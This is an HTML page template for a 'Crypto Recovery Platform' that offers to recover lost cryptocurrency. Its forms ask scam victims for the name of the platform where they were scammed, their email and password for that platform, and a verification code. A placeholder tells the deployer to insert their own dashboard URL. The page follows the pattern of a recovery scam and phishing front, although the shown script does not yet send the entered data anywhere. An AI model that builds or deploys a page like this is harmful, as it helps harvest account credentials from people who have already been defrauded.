<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Crypto Recovery Platform</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #0e7ee4;
      --secondary: #2dd4bf;
      --overlay: rgba(0, 0, 0, 0.72);
      --card-bg: rgba(255,255,255,0.92);
      --text-main: #1a202c;
      --text-subtle: #374151;
      --shadow: 0 6px 32px 0 rgba(30,41,59,0.14);
    }

    body, html {
      min-height: 100vh;
      margin: 0;
      font-family: 'Inter', Arial, sans-serif;
      color: var(--text-main);
      background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1500&q=80') center/cover no-repeat fixed;
      position: relative;
    }

    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: var(--overlay);
      z-index: 0;
      pointer-events: none;
    }

    .center-container {
      position: relative;
      z-index: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .card {
      background: var(--card-bg);
      border-radius: 1.5rem;
      box-shadow: var(--shadow);
      padding: 3rem 2.5rem 2.5rem 2.5rem;
      max-width: 400px;
      width: 100%;
      text-align: center;
      backdrop-filter: blur(6px);
    }

    .card h1 {
      font-size: 2.2rem;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 1rem;
      letter-spacing: -1px;
    }

    .card p {
      font-size: 1.1rem;
      color: var(--text-subtle);
      margin-bottom: 2.2rem;
      font-weight: 400;
    }

    .cta-btn, .verify-btn, .login-btn, .code-btn {
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      color: #fff;
      border: none;
      border-radius: 999px;
      padding: 0.95rem 2.4rem;
      font-size: 1.15rem;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 2px 16px 0 rgba(46,91,255,0.11);
      transition: transform 0.18s cubic-bezier(.42,.24,.44,1.09), box-shadow 0.18s;
      margin-top: 1.2rem;
    }

    .cta-btn:hover, .cta-btn:focus,
    .verify-btn:hover, .verify-btn:focus,
    .login-btn:hover, .login-btn:focus,
    .code-btn:hover, .code-btn:focus {
      transform: scale(1.06);
      box-shadow: 0 6px 32px 0 rgba(46,91,255,0.25);
      outline: none;
    }

    .hidden {
      display: none;
    }

    .input-group {
      margin-bottom: 1.5rem;
      text-align: left;
    }

    .input-group label {
      display: block;
      margin-bottom: 0.4rem;
      font-weight: 600;
      color: var(--primary);
      font-size: 1rem;
    }

    .input-group input {
      width: 100%;
      border-radius: 0.7rem;
      border: 1px solid #d1d5db;
      padding: 0.8rem 1rem;
      font-size: 1rem;
      margin-bottom: 0.3rem;
      box-sizing: border-box;
      outline: none;
      font-family: inherit;
      background: #fff;
      color: var(--text-main);
      transition: border 0.15s;
    }

    .input-group input:focus {
      border: 1.8px solid var(--primary);
    }

    .error-message {
      color: #e53e3e;
      font-size: 0.95rem;
      margin-bottom: 0.8rem;
      margin-top: -0.5rem;
      text-align: left;
    }

    @media (max-width: 600px) {
      .card {
        padding: 2rem 1.1rem 1.4rem 1.1rem;
        max-width: 95vw;
      }
      .card h1 {
        font-size: 1.4rem;
      }
      .cta-btn, .verify-btn, .login-btn, .code-btn {
        font-size: 1rem;
        padding: 0.7rem 1.5rem;
      }
    }
  </style>
</head>
<body>
  <div class="center-container">
    <!-- Initial Welcome Card -->
    <div class="card" id="welcome-card">
      <h1>Crypto Recovery Platform</h1>
      <p>
        Securely recover lost cryptocurrencies and assets with our trusted, transparent, and modern recovery solutions.
      </p>
      <button class="cta-btn" id="start-btn">Start Recovery</button>
    </div>

    <!-- Step 1: Platform Name Input -->
    <div class="card hidden" id="platform-card">
      <h1>Recovery Login</h1>
      <form id="platform-form">
        <div class="input-group">
          <label for="platform-input">Name of Investment Platform (you got scammed)</label>
          <input id="platform-input" name="platform" type="text" placeholder="e.g. Binance, Coinbase, etc." required />
        </div>
        <button type="submit" class="verify-btn">Verify</button>
      </form>
    </div>

    <!-- Step 2: Email and Password Input -->
    <div class="card hidden" id="login-card">
      <h1>Enter Credentials</h1>
      <form id="login-form">
        <div class="input-group">
          <label for="email-input">Email Address</label>
          <input id="email-input" name="email" type="email" placeholder="you@email.com" autocomplete="email" required />
        </div>
        <div class="input-group">
          <label for="password-input">Password</label>
          <input id="password-input" name="password" type="password" placeholder="Enter password" autocomplete="current-password" required />
        </div>
        <button type="submit" class="login-btn">Continue</button>
      </form>
    </div>

    <!-- Step 3: Enter Verification Code -->
    <div class="card hidden" id="code-card">
      <h1>Verification Code</h1>
      <form id="code-form">
        <div class="input-group">
          <label for="code-input">Enter the 6-digit code</label>
          <input id="code-input" name="code" type="text" placeholder="Enter code" required maxlength="6" minlength="6" />
        </div>
        <button type="submit" class="code-btn">Access Dashboard</button>
      </form>
      <div id="code-hint" style="margin-top:1rem;color:var(--secondary);font-weight:600;"></div>
    </div>
  </div>

  <script>
    // Set your dashboard URL here
    const DASHBOARD_URL = "YOUR_DASHBOARD_URL_HERE"; // <-- replace with your actual dashboard URL

    // Utility functions
    function showCard(cardId) {
      for (const id of ['welcome-card', 'platform-card', 'login-card', 'code-card']) {
        document.getElementById(id).classList.add('hidden');
      }
      document.getElementById(cardId).classList.remove('hidden');
    }

    // Step 1: Welcome -> Platform Name
    document.getElementById('start-btn').onclick = function() {
      showCard('platform-card');
    };

    // Step 2: Platform Name -> Credentials
    document.getElementById('platform-form').onsubmit = function(e) {
      e.preventDefault();
      showCard('login-card');
    };

    // Step 3: Credentials -> Verification Code
    let generatedCode = "";
    document.getElementById('login-form').onsubmit = function(e) {
      e.preventDefault();
      // Generate a 6-digit code and show it as a hint (for demo/testing; in real-world, send via email)
      generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
      showCard('code-card');
      document.getElementById('code-hint').textContent = "Your verification code: " + generatedCode;
    };

    // Step 4: Code input -> Validate and move to dashboard
    document.getElementById('code-form').onsubmit = function(e) {
      e.preventDefault();
      const inputCode = document.getElementById('code-input').value;
      if (inputCode === generatedCode) {
        // Redirect to dashboard
        window.location.href = DASHBOARD_URL;
      } else {
        alert("Incorrect code. Please try again.");
      }
    };
  </script>
</body>
</html>
